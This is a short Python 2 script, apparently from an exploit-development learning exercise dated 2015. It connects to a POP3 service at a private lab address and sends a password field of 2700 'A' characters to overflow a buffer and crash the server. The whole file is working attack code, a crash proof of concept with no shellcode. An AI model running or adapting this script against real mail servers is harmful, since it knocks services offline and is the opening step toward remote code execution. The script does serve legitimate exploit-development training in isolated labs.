#!/usr/bin/env python
# cccgoe 02.06.2015 - buffer overflow exploitation basics
#just sending a lot of 'A's to crash the program

#import socket library
import socket 

# AF_INET = IPv4, SOCK_STREAM = TCP, SOCK_DGREAM = UDP
# See http://openbook.galileocomputing.de/python/python_kapitel_20_001.htm
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

buffer = 'A' * 2700

# exception handler
try:
	print '\nSending buffer...'
	s.connect (('10.0.0.20',110))
	data=s.recv(1024)
	s.send('User test' + '\r\n')
	data=s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print '\n Done!'
except:
	print 'Could not connect to POP3!'


